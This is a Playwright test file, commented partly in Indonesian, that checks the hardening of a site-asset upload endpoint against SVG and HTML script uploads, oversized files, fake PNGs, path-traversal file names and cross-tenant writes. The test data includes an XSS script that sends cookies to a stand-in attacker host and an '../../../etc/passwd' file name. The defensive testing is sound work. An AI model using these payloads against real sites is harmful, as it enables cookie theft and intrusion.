// 09-upload.spec.mjs — OWASP A08 (Software & Data Integrity) — File upload hardening.
//
// Baseline backend facts (verified di apps/api/internal/assets/handler.go):
//   - Endpoint: POST /api/v1/sites/:id/assets (auth required, uploadLimit 60/jam/user)
//   - Multipart form field: "file"
//   - Content-Type allowlist: image/png, image/jpeg, image/webp, image/gif
//   - SVG (image/svg+xml) EXPLICIT rejected (XSS vector via <script>)
//   - Max size: 10 MB (line 19 MaxUploadBytes)
//   - Filename: basename-only (stored sebagai UUID + timestamp) — path traversal auto-neutralized
//   - Response: 201 sukses; 400 unsupported / size / bad request; 403 ownership

import { test, expect } from "@playwright/test";
import { loginAs } from "../../fixtures/auth.mjs";
import { deriveApiBase } from "../../fixtures/accounts.mjs";
import { req, act } from "../../fixtures/qa.mjs";

const apiBase = deriveApiBase();

// Helper — 1×1 PNG (67 bytes) sebagai baseline "valid" upload
// (untuk positive test kalau perlu).
const TINY_PNG_BASE64 =
  "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNkYAAAAAYAAjCB0C8AAAAASUVORK5CYII=";

async function uploadFile(accessToken, siteId, { filename, contentType, body }) {
  const form = new FormData();
  const blob = new Blob([body], { type: contentType });
  form.append("file", blob, filename);
  return fetch(`${apiBase}/api/v1/sites/${siteId}/assets`, {
    method: "POST",
    headers: { Authorization: `Bearer ${accessToken}` },
    body: form,
  });
}

async function createSite(accessToken, name) {
  const res = await fetch(`${apiBase}/api/v1/sites`, {
    method: "POST",
    headers: {
      Authorization: `Bearer ${accessToken}`,
      "Content-Type": "application/json",
    },
    body: JSON.stringify({ name, theme: {} }),
  });
  return (await res.json()).data;
}

async function deleteSite(accessToken, siteId) {
  return fetch(`${apiBase}/api/v1/sites/${siteId}`, {
    method: "DELETE",
    headers: { Authorization: `Bearer ${accessToken}` },
  }).catch(() => {});
}

test.describe("A08 — Asset upload input validation", () => {
  test("Upload SVG (image/svg+xml) → 400 (XSS vector rejected explicitly)", async ({
    context,
  }, testInfo) => {
    req(
      testInfo,
      "POST /sites/:id/assets multipart file={type: image/svg+xml, body: SVG dengan <script>alert(1)</script>} → HTTP 400. SVG bisa embed <script> yang execute di renderer serve (kalau bukan sanitized), jadi backend WAJIB reject.",
    );
    const { accessToken } = await loginAs(context, "client");
    const site = await createSite(accessToken, `QA Upload SVG ${Date.now()}`);
    try {
      const svgPayload = `<svg xmlns="http://www.w3.org/2000/svg" width="1" height="1"><script>alert("xss")</script></svg>`;
      const res = await uploadFile(accessToken, site.id, {
        filename: "evil.svg",
        contentType: "image/svg+xml",
        body: svgPayload,
      });
      expect(res.status).toBe(400);
      const body = await res.json().catch(() => ({}));
      act(
        testInfo,
        `HTTP ${res.status}, error.code="${body.error?.code || "n/a"}" — SVG rejected sebelum tersimpan`,
      );
    } finally {
      await deleteSite(accessToken, site.id);
    }
  });

  test("Upload text/html content-type → 400 (bukan di allowlist)", async ({
    context,
  }, testInfo) => {
    req(
      testInfo,
      "POST /sites/:id/assets multipart file={type: text/html, body: <script>...</script>} → HTTP 400. Content-Type text/html tidak di allowlist (cuma png/jpeg/webp/gif). Cegah stored XSS via serve upload directory.",
    );
    const { accessToken } = await loginAs(context, "client");
    const site = await createSite(accessToken, `QA Upload HTML ${Date.now()}`);
    try {
      const evil = `<html><body><script>document.location='https://attacker.com/?ck='+document.cookie</script></body></html>`;
      const res = await uploadFile(accessToken, site.id, {
        filename: "evil.html",
        contentType: "text/html",
        body: evil,
      });
      expect(res.status).toBe(400);
      act(testInfo, `HTTP ${res.status} — text/html rejected`);
    } finally {
      await deleteSite(accessToken, site.id);
    }
  });

  test("Upload > 10 MB → 400 (size limit enforced)", async ({ context }, testInfo) => {
    req(
      testInfo,
      "POST /sites/:id/assets file 11 MB → HTTP 400 'file too large (max 10MB)'. Cegah DoS via huge upload. Backend cek size dua kali (pre-compress + post-compress).",
    );
    const { accessToken } = await loginAs(context, "client");
    const site = await createSite(accessToken, `QA Upload Size ${Date.now()}`);
    try {
      // 11 MB buffer — di atas MaxUploadBytes 10 MB
      const bigBuffer = new Uint8Array(11 * 1024 * 1024).fill(0x89); // PNG magic byte first
      const res = await uploadFile(accessToken, site.id, {
        filename: "huge.png",
        contentType: "image/png",
        body: bigBuffer,
      });
      // 400 (validation) atau 413 (payload too large di some servers).
      expect([400, 413]).toContain(res.status);
      expect(res.status).not.toBe(201);
      act(
        testInfo,
        `HTTP ${res.status}, 11MB payload ditolak (limit 10 MB enforced)`,
      );
    } finally {
      await deleteSite(accessToken, site.id);
    }
  });

  test("Upload PNG dengan HTML body (magic byte mismatch) → dokumentasi behavior", async ({
    context,
  }, testInfo) => {
    req(
      testInfo,
      "POST /sites/:id/assets file={filename: 'sneaky.png', contentType: image/png, body: <html>...</html>} → dokumentasi behavior backend. Handler cek content-type allowlist tapi TIDAK magic byte verify. Ekspektasi: backend accept (201) → tapi Compress() decode fail → file mungkin tetap tersimpan. Test ini untuk KAPTEN behavior aktual — bukan hard-fail.",
    );
    const { accessToken } = await loginAs(context, "client");
    const site = await createSite(accessToken, `QA Upload Polyglot ${Date.now()}`);
    try {
      const fakePng = `<html><body>Not a PNG</body></html>`;
      const res = await uploadFile(accessToken, site.id, {
        filename: "sneaky.png",
        contentType: "image/png",
        body: fakePng,
      });
      // Ekspektasi: backend accept (bad — no magic byte check) atau reject (good).
      // Kedua-nya bukan 500 crash. Test dokumentasikan.
      expect(res.status).not.toBe(500);
      const summary =
        res.status === 201
          ? "GAP: accept polyglot PNG-HTML (magic byte tidak di-check)"
          : `reject with HTTP ${res.status}`;
      act(testInfo, `HTTP ${res.status} — ${summary}`);
    } finally {
      await deleteSite(accessToken, site.id);
    }
  });

  test("Upload filename dengan path traversal → basename-only stored (no shell exec)", async ({
    context,
  }, testInfo) => {
    req(
      testInfo,
      "POST /sites/:id/assets file={filename: '../../etc/passwd.png', contentType: image/png, body: valid tiny PNG} → HTTP 201, response.url TIDAK mengandung '../../' path traversal. Backend generate filename baru pakai UUID + timestamp (basename discarded).",
    );
    const { accessToken } = await loginAs(context, "client");
    const site = await createSite(accessToken, `QA Path Traversal ${Date.now()}`);
    try {
      const pngBytes = Uint8Array.from(atob(TINY_PNG_BASE64), (c) => c.charCodeAt(0));
      const res = await uploadFile(accessToken, site.id, {
        filename: "../../../etc/passwd.png",
        contentType: "image/png",
        body: pngBytes,
      });
      // 201 = accept (backend rename ke UUID)
      // 400 = reject filename → juga OK secure
      expect([201, 400]).toContain(res.status);
      if (res.status === 201) {
        const asset = (await res.json()).data;
        // URL mesti bebas path traversal (semua backend simpan pakai UUID)
        expect(asset.url || "").not.toContain("../");
        expect(asset.url || "").not.toContain("etc/passwd");
        act(
          testInfo,
          `HTTP 201, url="${(asset.url || "").slice(0, 80)}", no path traversal (basename sanitized to UUID)`,
        );
      } else {
        act(testInfo, `HTTP ${res.status} — malicious filename rejected upfront`);
      }
    } finally {
      await deleteSite(accessToken, site.id);
    }
  });

  test("Cross-tenant: client A upload ke site milik client B → 403/404", async ({
    context,
  }, testInfo) => {
    req(
      testInfo,
      "Setup: client bikin site X. Login sebagai agent → POST /sites/X/assets → HTTP 403/404. Ownership check di handler harus block cross-tenant asset write (kalau lolos, attacker bisa flood storage user lain + attribute file berbahaya).",
    );
    const { accessToken: clientToken } = await loginAs(context, "client");
    const { accessToken: agentToken } = await loginAs(context, "agent");
    const site = await createSite(clientToken, `QA XTenant Upload ${Date.now()}`);
    try {
      const pngBytes = Uint8Array.from(atob(TINY_PNG_BASE64), (c) => c.charCodeAt(0));
      const res = await uploadFile(agentToken, site.id, {
        filename: "attacker.png",
        contentType: "image/png",
        body: pngBytes,
      });
      expect([403, 404]).toContain(res.status);
      expect(res.status).not.toBe(201);
      act(testInfo, `HTTP ${res.status} — cross-tenant upload ditolak (ownership gate)`);
    } finally {
      await deleteSite(clientToken, site.id);
    }
  });
});
